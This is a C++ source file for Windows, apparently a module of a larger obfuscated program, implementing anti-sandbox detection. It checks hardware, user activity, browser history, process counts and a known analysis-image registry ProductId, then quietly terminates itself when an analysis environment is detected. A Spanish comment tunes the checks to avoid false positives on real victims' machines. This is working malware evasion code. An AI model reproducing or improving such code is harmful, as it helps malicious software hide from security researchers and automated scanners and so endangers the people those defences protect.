#include "anti_sandbox.h"
#include <windows.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <intrin.h>
#include <cstring>
#include <cstdint>
#include "../legal/ai_protection.h"
#include "../obfuscation_map.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

namespace anti_sandbox {

static SandboxDetectionResult g_last_result = { SandboxType::NONE, false, 0 };

static bool check_string_match(const char* str, const char* pattern) {
    if (!str || !pattern) return false;
    while (*pattern) {
        if (!*str) return false;
        char c1 = *str;
        char c2 = *pattern;
        if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
        if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
        if (c1 != c2) return false;
        str++;
        pattern++;
    }
    return true;
}

static bool check_low_ram() {
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        uint64_t total_ram_mb = ms.ullTotalPhys / (1024 * 1024);
        if (total_ram_mb < 4096) return true;
    }
    return false;
}

static bool check_low_cpu() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;
    return false;
}

static bool check_low_disk() {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
        uint64_t total_gb = totalBytes.QuadPart / (1024ULL * 1024 * 1024);
        if (total_gb < 50) return true;
    }
    return false;
}

static bool check_recent_activity() {
    WIN32_FIND_DATAA findData;
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH)) {
        char recentPath[MAX_PATH];
        wsprintfA(recentPath, "%s\\Desktop\\*", userProfile);
        HANDLE hFind = FindFirstFileA(recentPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            int fileCount = 0;
            do {
                if (strcmp(findData.cFileName, ".") != 0 &&
                    strcmp(findData.cFileName, "..") != 0) {
                    fileCount++;
                    if (fileCount >= 3) {
                        FindClose(hFind);
                        return false;
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
            if (fileCount < 3) return true;
        }
    }
    return false;
}

static bool check_mouse_movement() {
    POINT lastPos, currentPos;
    if (!GetCursorPos(&lastPos)) return false;
    Sleep(5000);
    if (!GetCursorPos(&currentPos)) return false;
    int dx = abs(currentPos.x - lastPos.x);
    int dy = abs(currentPos.y - lastPos.y);
    if (dx < 5 && dy < 5) return true;
    return false;
}

static bool check_installed_software() {
    HKEY hKey;
    int softwareCount = 0;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char subKeyName[256];
        DWORD subKeyNameSize;
        DWORD index = 0;
        subKeyNameSize = sizeof(subKeyName);
        while (RegEnumKeyExA(hKey, index, subKeyName, &subKeyNameSize,
            NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            softwareCount++;
            subKeyNameSize = sizeof(subKeyName);
            index++;
            if (softwareCount >= 10) break;
        }
        RegCloseKey(hKey);
    }
    if (softwareCount < 10) return true;
    return false;
}

static bool check_uptime() {
    DWORD tickCount = GetTickCount();
    DWORD uptimeMinutes = tickCount / (1000 * 60);
    if (uptimeMinutes < 10) return true;
    return false;
}

static bool check_sleep_evasion() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(3000);
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / (double)freq.QuadPart;
    if (elapsed < 2.5) return true;
    return false;
}

static bool check_disk_space_low() {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
        uint64_t free_gb = freeBytesAvailable.QuadPart / (1024ULL * 1024 * 1024);
        if (free_gb < 60) return true;
    }
    return false;
}

static bool check_recent_documents() {
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH)) {
        char recentPath[MAX_PATH];
        wsprintfA(recentPath, "%s\\Recent\\*", userProfile);
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(recentPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            int count = 0;
            do {
                if (strcmp(findData.cFileName, ".") != 0 &&
                    strcmp(findData.cFileName, "..") != 0) {
                    count++;
                    if (count >= 5) {
                        FindClose(hFind);
                        return false;
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
            if (count < 5) return true;
        }
    }
    return false;
}

static bool check_browser_history() {
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH)) {
        char chromePath[MAX_PATH];
        wsprintfA(chromePath, "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", userProfile);
        DWORD attrs = GetFileAttributesA(chromePath);
        if (attrs == INVALID_FILE_ATTRIBUTES) return true;
    }
    return false;
}

static bool check_temp_folder() {
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        WIN32_FIND_DATAA findData;
        char searchPath[MAX_PATH];
        wsprintfA(searchPath, "%s*", tempPath);
        HANDLE hFind = FindFirstFileA(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            int count = 0;
            do {
                if (strcmp(findData.cFileName, ".") != 0 &&
                    strcmp(findData.cFileName, "..") != 0) {
                    count++;
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
            if (count < 3) return true;
        }
    }
    return false;
}

static bool check_network_adapters() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD bufferSize = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_SUCCESS) {
        int adapterCount = 0;
        PIP_ADAPTER_INFO pAdapter = adapterInfo;
        while (pAdapter) {
            adapterCount++;
            pAdapter = pAdapter->Next;
        }
        if (adapterCount < 2) return true;
    }
    return false;
}

static bool check_process_count() {
    DWORD processes[1024], needed, processCount;
    if (EnumProcesses(processes, sizeof(processes), &needed)) {
        processCount = needed / sizeof(DWORD);
        if (processCount < 30) return true;
    }
    return false;
}

static bool check_display_resolution() {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    if (width < 1024 || height < 768) return true;
    return false;
}

static bool check_time_bias() {
    TIME_ZONE_INFORMATION tzi;
    DWORD tzResult = GetTimeZoneInformation(&tzi);
    if (tzResult == TIME_ZONE_ID_INVALID) return true;
    if (abs(tzi.Bias) > 12 * 60) return true;
    return false;
}

static bool check_registry_artifacts() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        DWORD type = 0;
        if (RegQueryValueExA(hKey, "ProductId", NULL, &type,
            (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            if (check_string_match(buffer, "76487-644-3177037-23510")) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}

bool initialize() {
    g_last_result = { SandboxType::NONE, false, 0 };
    return true;
}

SandboxDetectionResult run_all_checks() {
    // Politica (2026-08-23): SOLO indicadores duros. Los heuristics blandos
    // (low_ram/low_cpu/disk/uptime/mouse/software/history/temp/resolution/time_bias)
    // producen falsos positivos graves en maquinas reales (usuario AFK 5s => "sandbox").
    // Un sandbox real que evada estos checks tampoco los fallaria; en cambio los
    // artifacts concretos SI delatan el entorno.
    if (check_registry_artifacts()) {
        // ProductId de imagenes de sandbox/analisis conocidas
        g_last_result = { SandboxType::ANALYSIS_ENV, true, 1 };
        return g_last_result;
    }
    g_last_result = { SandboxType::NONE, false, 0 };
    return g_last_result;
}

void terminate_if_sandbox() {
    SandboxDetectionResult result = run_all_checks();
    if (result.detected) {
        volatile int delay = 0;
        for (volatile int i = 0; i < 1000000; i++) {
            delay += i * 3;
        }
        TerminateProcess(GetCurrentProcess(), 0);
    }
}

}
